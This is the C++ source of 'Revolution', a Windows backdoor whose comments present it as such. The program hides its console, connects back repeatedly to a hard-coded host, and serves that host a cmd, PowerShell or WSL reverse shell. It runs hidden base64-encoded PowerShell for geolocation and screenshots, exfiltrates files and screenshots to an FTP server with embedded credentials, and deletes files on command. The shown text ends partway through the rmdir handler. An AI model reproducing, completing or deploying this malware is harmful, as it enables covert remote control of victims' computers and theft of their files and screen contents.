// Created By Unamed (Dxvistxr,DarkPamplemousse,0x4eff)
//command for compile : i686-w64-mingw32-g++ revolution_backdoor_windows.cpp -o revolution.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -lwininet -lwinhttp
// listen server with netcat : nc -lvp <PORT>
// First Backdoor In C By Unamed !
// Version : 0.1 (beta) 30/10/2019
// src : https://openclassrooms.com/forum/sujet/transfert-de-fichier-sur-un-ftp-en-c-27687

#include <stdio.h>
#include <winsock2.h>
#include <pthread.h>
#include <windows.h>
#include <string.h>
#include <ws2tcpip.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <iostream>
#include <string>
#include <stdexcept>
#include <direct.h>
#include <wininet.h> // -lwininet
//#include <winhttp.h> // -lwinhttp
#define GetCurrentDir _getcwd
#define GetCurrentDir getcwd

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
//#pragma comment(lib, "Winhttp.lib")

#define BUFFER_SIZE 4096
#define REMOTE_HOST "192.168.1.71"
#define REMOTE_PORT 444
#define FTP_SERVER "192.168.1.71"
#define FTP_USER "unamed"
#define FTP_PASS "test123"

using namespace std;

bool StartsWith(const char *a, const char *b)
{
   if(strncmp(a, b, strlen(b)) == 0) return 1;
   return 0;
}

/*void requests_https_get(wchar_t *url){
    wchar_t delim[BUFFER_SIZE] = L"/";
    wchar_t *req = wcstok(url,delim);
    wchar_t host[BUFFER_SIZE] = L"";
    wchar_t path_requests[BUFFER_SIZE] = L"/";
    //host
    req = wcstok(NULL,delim);
    wcscat(host,req);
    //path requests
    req = wcstok(NULL,delim);
    wcscat(path_requests,req);
    LPSTR pszOutBuffer;
    DWORD dwDownloaded = 0;
    DWORD dwSize = 0;
    BOOL  bResults = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL,hRequest = NULL;
    hSession = WinHttpOpen(  L"A WinHTTP Example Program/1.0",WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    hConnect = WinHttpConnect( hSession, host,443, 0);
    hRequest = WinHttpOpenRequest( hConnect, L"GET", path_requests,NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    bResults = WinHttpSendRequest( hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    bResults = WinHttpReceiveResponse( hRequest, NULL);
    if (!bResults)
        printf("Error %d has occurred.\n",GetLastError());
    
    if (bResults)
    {
        do 
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable( hRequest, &dwSize)) 
            {
                printf( "Error %u in WinHttpQueryDataAvailable.\n",
                        GetLastError());
                break;
            }
            
            // No more available data.
            if (!dwSize)
                break;

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize+1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                break;
            }
            
            // Read the Data.
            ZeroMemory(pszOutBuffer, dwSize+1);

            if (!WinHttpReadData( hRequest, (LPVOID)pszOutBuffer, 
                                  dwSize, &dwDownloaded))
            {                                  
                printf( "Error %u in WinHttpReadData.\n", GetLastError());
            }
            else
            {
                printf("%s", pszOutBuffer);
            }
        
            // Free the memory allocated to the buffer.
            delete [] pszOutBuffer;

            // This condition should never be reached since WinHttpQueryDataAvailable
            // reported that there are bits to read.
            if (!dwDownloaded)
                break;
                
        } while (dwSize > 0);
    }
    else
    {
        // Report any errors.
        printf( "Error %d has occurred.\n", GetLastError() );
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}*/

int isDirectoryExists(const char *path)
{
    struct stat stats;

    stat(path, &stats);

    // Check for file existence
    if (S_ISDIR(stats.st_mode))
        return 1;

    return 0;
}

char *c_path[BUFFER_SIZE];

int main(){
    FreeConsole();
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_MINIMIZE);
    ShowWindow(hWnd, SW_HIDE);
    // init socket
    WSADATA wsa_version;
    SOCKET socks;
    struct sockaddr_in server;
    char buffer[4096];
    //HINTERNET hinet, hftp;

    WSAStartup(MAKEWORD(2,2), &wsa_version);
    socks = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, 0, 0, 0);
    server.sin_addr.s_addr = inet_addr(REMOTE_HOST);
    server.sin_port = htons(REMOTE_PORT);
    server.sin_family = AF_INET;

    while (true)
    {
        
        if (WSAConnect(socks, (struct sockaddr *)&server, sizeof(server), 0, 0, 0,0) != 0)
        {
            closesocket(socks);
            WSACleanup();
            continue;
        }
        else{
            char lp[BUFFER_SIZE] = "[*] Connected To : ";
            char hostname[BUFFER_SIZE];
            struct hostent* h;
            h = gethostbyname(hostname);
            strcat(lp,h->h_name);
            strcat(lp,"\n");
            send(socks,lp,strlen(lp)+1,0);
            while (true){
                // input console netcat
                char while_path[BUFFER_SIZE];
                GetCurrentDir(while_path,BUFFER_SIZE);
                char input_console[BUFFER_SIZE] = "\033[1;96mRevolution\033[1;90m@\033[00m";
                strcat(input_console,h->h_name);
                strcat(input_console,":");
                strcat(input_console,while_path);
                strcat(input_console,"$ ");
                send(socks,input_console,strlen(input_console)+1,0);

                char recvdata[BUFFER_SIZE];
                memset(recvdata, 0, sizeof(recvdata));
                int RecvCode = recv(socks, recvdata, BUFFER_SIZE, 0);
                
                if (RecvCode <= 0) {
                    closesocket(socks);
                    WSACleanup();
                    continue;
                }
                else{
                    if (strcmp(recvdata, "help\n")==0){
                        char response[65556] = "*********Welcome To Revolution*********]\n";
                        strcat(response,"     Created By Unamed Alias (Dxvistxr,0x4eff)\n");
                        strcat(response,"             Simple Backdoor Write in C\n");
                        strcat(response,"\n");
                        strcat(response,"  dir                        List Dirrectory\n");
                        strcat(response,"  ls                         List Dirrectory\n");
                        strcat(response,"  dw <filename>              Download File\n");
                        strcat(response,"  dl <filename>              Delete File\n");
                        strcat(response,"  mkdir <folder>             Make Dir\n");
                        strcat(response,"  rmdir <folder>             Delete Folder\n");
                        strcat(response,"  move <old_name> <new_name> Move\n");
                        strcat(response,"  ren <old_name> <new_name>  Rename Folder or File\n");
                        strcat(response,"  sysinfo, systeminfo        Get Informations Of Target System\n");
                        strcat(response,"  shell                      Interactive Shell (Cmd)\n");
                        strcat(response,"  pwsh                       Get Powershell (Powershell)\n");
                        strcat(response,"  ifconfig                   Get Ifconfig\n");
                        strcat(response,"  ipconfig                   Get Ipconfig\n");
                        strcat(response,"  ifconfig_all               Get All ifconfig\n");
                        strcat(response,"  ipconfig_all               Get All Ipconfig\n");
                        strcat(response,"  netsh  Show                Settings NetShell\n");
                        strcat(response,"  cat <file>                 Read File\n");
                        strcat(response,"  exit                       Exit Backdoor\n");
                        strcat(response,"  quit                       Exit Backdoor\n");
                        strcat(response,"  ipgeo                      Returns approximately the geolocation of the ip address\n");
                        strcat(response,"  get_hostname               Get Hostname\n");
                        strcat(response,"  copy <file1> <file2>       Copy File\n");
                        strcat(response,"  process <process_name.exe> Open Process\n");
                        strcat(response,"  tasklist                   List Task Process\n");
                        strcat(response,"  taskkill <process_name.exe> Kill Process\n");
                        strcat(response,"  screenshot                  Take ScreenShot\n");
                        send(socks,response,strlen(response)+1,0);
                    }

                    else if (strcmp(recvdata, "shell\n")==0){
                        char Process[] = "cmd.exe";
                        
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        
                        CloseHandle(pinfo.hProcess);
                        
                        CloseHandle(pinfo.hThread);
                    }

                    else if(strcmp(recvdata,"wsl\n")==0){
                        char Process[] = "wsl.exe";
                        
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        
                        CloseHandle(pinfo.hProcess);
                        
                        CloseHandle(pinfo.hThread);
                    }


                    else if(strcmp(recvdata, "pwsh\n")==0){
                        char Process[] = "powershell.exe";
                        
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        
                        CloseHandle(pinfo.hProcess);
                        
                        CloseHandle(pinfo.hThread);
                    }

                    else if (strcmp(recvdata, "exit\n")==0){
                        exit(0);
                    }

                    else if (strcmp(recvdata, "quit\n")==0){
                        exit(0);
                    }


                    else if(strcmp(recvdata,"get_ip\n")==0){
                        char payload[BUFFER_SIZE] = "JAByACAAPQAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBSAEkAIAAiAGgAdAB0AHAAcwA6AC8ALwBpAGYAYwBvAG4AZgBpAGcALgBtAGUALwBpAHAAIgA7ACQAYwBvAG4AdABlAG4AdAAgAD0AIAAkAHIALgBDAG8AbgB0AGUAbgB0ADsAZQBjAGgAbwAgACQAYwBvAG4AdABlAG4AdAA7AA==";
                        char Process[] = "powershell.exe -windowstyle hidden -EncodedCommand ";
                        strcat(Process,payload);
                        
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        
                        CloseHandle(pinfo.hProcess);
                        
                        CloseHandle(pinfo.hThread);
                    }

                    else if(strcmp(recvdata,"ipgeo\n")==0){
                        char payload[BUFFER_SIZE] = "JAByACAAPQAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBSAEkAIAAiAGgAdAB0AHAAcwA6AC8ALwBpAHAAaQBuAGYAbwAuAGkAbwAvAGoAcwBvAG4AIgA7ACQAYwBvAG4AdABlAG4AdABfAGkAcABnAGUAbwAgAD0AIAAkAHIALgBDAG8AbgB0AGUAbgB0ADsAZQBjAGgAbwAgACQAYwBvAG4AdABlAG4AdABfAGkAcABnAGUAbwA7AA==";
                        char Process[] = "powershell.exe -windowstyle hidden -EncodedCommand ";
                        strcat(Process,payload);
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if(strcmp(recvdata,"ifconfig\n")==0){
                        char Process[] = "cmd.exe /c ipconfig";
                        
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        
                        CloseHandle(pinfo.hProcess);
                        
                        CloseHandle(pinfo.hThread);
                    }

                    else if(strcmp(recvdata,"ipconfig\n")==0){
                        char Process[] = "cmd.exe /c ipconfig";
                        
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        
                        CloseHandle(pinfo.hProcess);
                        
                        CloseHandle(pinfo.hThread);
                    }

                    else if(strcmp(recvdata,"ifconfig_all\n")==0){
                        char Process[] = "cmd.exe /c ipconfig /all";
                        
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        
                        CloseHandle(pinfo.hProcess);
                        
                        CloseHandle(pinfo.hThread);
                    }


                    else if(strcmp(recvdata,"ipconfig_all\n")==0){
                        char Process[] = "cmd.exe /c ipconfig /all";
                        
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        
                        CloseHandle(pinfo.hProcess);
                        
                        CloseHandle(pinfo.hThread);
                    }


                    else if (strcmp(recvdata,"dir\n")==0){
                        char Process[] = "cmd.exe /c dir";
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if (strcmp(recvdata,"ls\n")==0){
                        char Process[] = "cmd.exe /c dir";
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if(strcmp(recvdata,"get_hostname\n")==0){
                        char Process[] = "cmd.exe /c hostname";
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if(strcmp(recvdata,"screenshot\n")==0){
                        char ftp_file[BUFFER_SIZE] = "screen01.png";
                        char payload[65535] = "QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAsAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAcwBjAHIAZQBlAG4AcwAgAD0AIABbAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMALgBTAGMAcgBlAGUAbgBdADoAOgBBAGwAbABTAGMAcgBlAGUAbgBzADsAJAB0AG8AcAAgACAAIAAgAD0AIAAoACQAcwBjAHIAZQBlAG4AcwAuAEIAbwB1AG4AZABzAC4AVABvAHAAIAAgACAAIAB8ACAATQBlAGEAcwB1AHIAZQAtAE8AYgBqAGUAYwB0ACAALQBNAGkAbgBpAG0AdQBtACkALgBNAGkAbgBpAG0AdQBtADsAJABsAGUAZgB0ACAAIAAgAD0AIAAoACQAcwBjAHIAZQBlAG4AcwAuAEIAbwB1AG4AZABzAC4ATABlAGYAdAAgACAAIAB8ACAATQBlAGEAcwB1AHIAZQAtAE8AYgBqAGUAYwB0ACAALQBNAGkAbgBpAG0AdQBtACkALgBNAGkAbgBpAG0AdQBtADsAJAB3AGkAZAB0AGgAIAAgAD0AIAAoACQAcwBjAHIAZQBlAG4AcwAuAEIAbwB1AG4AZABzAC4AUgBpAGcAaAB0ACAAIAB8ACAATQBlAGEAcwB1AHIAZQAtAE8AYgBqAGUAYwB0ACAALQBNAGEAeABpAG0AdQBtACkALgBNAGEAeABpAG0AdQBtADsAJABoAGUAaQBnAGgAdAAgAD0AIAAoACQAcwBjAHIAZQBlAG4AcwAuAEIAbwB1AG4AZABzAC4AQgBvAHQAdABvAG0AIAB8ACAATQBlAGEAcwB1AHIAZQAtAE8AYgBqAGUAYwB0ACAALQBNAGEAeABpAG0AdQBtACkALgBNAGEAeABpAG0AdQBtADsAJABiAG8AdQBuAGQAcwAgACAAIAA9ACAAWwBEAHIAYQB3AGkAbgBnAC4AUgBlAGMAdABhAG4AZwBsAGUAXQA6ADoARgByAG8AbQBMAFQAUgBCACgAJABsAGUAZgB0ACwAIAAkAHQAbwBwACwAIAAkAHcAaQBkAHQAaAAsACAAJABoAGUAaQBnAGgAdAApADsAJABiAG0AcAAgACAAIAAgACAAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwACAAKABbAGkAbgB0AF0AJABiAG8AdQBuAGQAcwAuAHcAaQBkAHQAaAApACwAIAAoAFsAaQBuAHQAXQAkAGIAbwB1AG4AZABzAC4AaABlAGkAZwBoAHQAKQA7ACQAZwByAGEAcABoAGkAYwBzACAAPQAgAFsARAByAGEAdwBpAG4AZwAuAEcAcgBhAHAAaABpAGMAcwBdADoAOgBGAHIAbwBtAEkAbQBhAGcAZQAoACQAYgBtAHAAKQA7ACQAZwByAGEAcABoAGkAYwBzAC4AQwBvAHAAeQBGAHIAbwBtAFMAYwByAGUAZQBuACgAJABiAG8AdQBuAGQAcwAuAEwAbwBjAGEAdABpAG8AbgAsACAAWwBEAHIAYQB3AGkAbgBnAC4AUABvAGkAbgB0AF0AOgA6AEUAbQBwAHQAeQAsACAAJABiAG8AdQBuAGQAcwAuAHMAaQB6AGUAKQA7ACQAYgBtAHAALgBTAGEAdgBlACgAIgBzAGMAcgBlAGUAbgAwADEALgBwAG4AZwAiACkAOwAkAGcAcgBhAHAAaABpAGMAcwAuAEQAaQBzAHAAbwBzAGUAKAApADsAJABiAG0AcAAuAEQAaQBzAHAAbwBzAGUAKAApADsA";
                        char Process[] = "powershell.exe -windowstyle hidden -EncodedCommand ";
                        strcat(Process,payload);
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                        HINTERNET hNet;
                        hNet = InternetOpen("Ftp", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
                        if(hNet != INVALID_HANDLE_VALUE)
                        {
                            //printf("InternetOpen()......OK\n");
                            HINTERNET hFtp = InternetConnect(hNet,FTP_SERVER,INTERNET_DEFAULT_FTP_PORT,FTP_USER,FTP_PASS,INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE,0);
                            if(hFtp != INVALID_HANDLE_VALUE)
                            {
                                //printf("InternetConnect() ..... OK\n");
                                //printf("FtpPutFile() .... En cours");
                                if(FtpPutFile(hFtp, ftp_file, ftp_file, FTP_TRANSFER_TYPE_BINARY, 0))
                                {
                                    //printf("\rFtpPutFile() .......... OK\n");
                                    char buff_done[BUFFER_SIZE] = "\n[*] ";
                                    strcat(buff_done,ftp_file);
                                    strcat(buff_done," Downloaded !\n");
                                    send(socks,buff_done,strlen(buff_done)+1,0);
                                }else{
                                    //printf("\rFtpPutFile() .......... ECHEC !\n");
                                    char buff_error[BUFFER_SIZE] = "[*] ";
                                    strcat(buff_error,ftp_file);
                                    strcat(buff_error," Error Downloaded !\n");
                                    send(socks,buff_error,strlen(buff_error)+1,0);
                                }
                                InternetCloseHandle(hFtp);          
                            }
                        }
                        char erase_screenshot[BUFFER_SIZE] = "cmd.exe /C del screen01.png";
                        STARTUPINFO ssinfo;
                        PROCESS_INFORMATION ppinfo;
                        memset(&sinfo, 0, sizeof(ssinfo));
                        ssinfo.cb = sizeof(ssinfo);
                        ssinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = ssinfo.hStdOutput = ssinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, erase_screenshot, NULL, NULL, TRUE, 0, NULL, NULL, &ssinfo, &ppinfo);
                        WaitForSingleObject(ppinfo.hProcess, INFINITE);
                        CloseHandle(ppinfo.hProcess);
                        CloseHandle(ppinfo.hThread);
                    }

                    else if(StartsWith(recvdata,"dw")){
                        char split_buffer[BUFFER_SIZE];
                        strcpy(split_buffer,recvdata);
                        char *split_file = strtok(split_buffer," ");
                        split_file = strtok(NULL," ");
                        char split_cn[BUFFER_SIZE] = "\n";
                        char *ftp_file = strtok(split_file,split_cn);
                        HINTERNET hNet;
                        hNet = InternetOpen("Ftp", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
                        if(hNet != INVALID_HANDLE_VALUE)
                        {
                            //printf("InternetOpen()......OK\n");
                            HINTERNET hFtp = InternetConnect(hNet,FTP_SERVER,INTERNET_DEFAULT_FTP_PORT,FTP_USER,FTP_PASS,INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE,0);
                            if(hFtp != INVALID_HANDLE_VALUE)
                            {
                                //printf("InternetConnect() ..... OK\n");
                                //printf("FtpPutFile() .... En cours");
                                if(FtpPutFile(hFtp, ftp_file, ftp_file, FTP_TRANSFER_TYPE_BINARY, 0))
                                {
                                    //printf("\rFtpPutFile() .......... OK\n");
                                    char buff_done[BUFFER_SIZE] = "[*] ";
                                    strcat(buff_done,ftp_file);
                                    strcat(buff_done," Downloaded !\n");
                                    send(socks,buff_done,strlen(buff_done)+1,0);
                                }else{
                                    //printf("\rFtpPutFile() .......... ECHEC !\n");
                                    char buff_error[BUFFER_SIZE] = "[*] ";
                                    strcat(buff_error,ftp_file);
                                    strcat(buff_error," Error Downloaded !\n");
                                    send(socks,buff_error,strlen(buff_error)+1,0);
                                }
                                InternetCloseHandle(hFtp);          
                            }
                        }
                    }

                    else if (strcmp(recvdata, "pwd\n")==0){
                        char buffer[BUFFER_SIZE];
                        char return_pwd[BUFFER_SIZE] = "[*] Current Path : ";
                        GetCurrentDir(buffer,BUFFER_SIZE);
                        strcat(buffer,"\n");
                        strcat(return_pwd,buffer);
                        send(socks,return_pwd,strlen(return_pwd)+1,0);
                    }

                    else if (strcmp(recvdata, "clear\n")==0){
                        char buffer[BUFFER_SIZE]="\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
                        send(socks,buffer,strlen(buffer)+1,0);
                    }

                    else if (StartsWith(recvdata,"cat")){
                        char split_buffer[BUFFER_SIZE];
                        strcpy(split_buffer,recvdata);
                        char *split_file = strtok(split_buffer," ");
                        split_file = strtok(NULL," ");
                        char split_cn[BUFFER_SIZE] = "\n";
                        char *split_file2 = strtok(split_file,split_cn);
                        char command[BUFFER_SIZE] = "cmd.exe /c type ";
                        strcat(command,split_file2);
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if(StartsWith(recvdata,"dl")){
                        char split_buffer[BUFFER_SIZE];
                        strcpy(split_buffer,recvdata);
                        char *split_file = strtok(split_buffer," ");
                        split_file = strtok(NULL," ");
                        char split_cn[BUFFER_SIZE] = "\n";
                        char *folder_file = strtok(split_file,split_cn);
                        char command[BUFFER_SIZE] = "cmd.exe /C del ";
                        strcat(command,folder_file);
                        strcat(command," /Q");
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }


                    else if(StartsWith(recvdata,"mkdir")){
                        char split_buffer[BUFFER_SIZE];
                        strcpy(split_buffer,recvdata);
                        char *split_file = strtok(split_buffer," ");
                        split_file = strtok(NULL," ");
                        char split_cn[BUFFER_SIZE] = "\n";
                        char *folder_file = strtok(split_file,split_cn);
                        char command[BUFFER_SIZE] = "cmd.exe /C mkdir ";
                        strcat(command,folder_file);
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }


                    else if(StartsWith(recvdata,"rmdir")){
                        char split_buffer[BUFFER_SIZE];
                        strcpy(split_buffer,recvdata);
                        char *split_file = strtok(split_buffer," ");
                        split_file = strtok(NULL," ");
                        char split_cn[BUFFER_SIZE] = "\n";
                        char *folder_file = strtok(split_file,split_cn);
                        char command[BUFFER_SIZE] = "cmd.exe /C rmdir ";
                        strcat(command,folder_file);
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
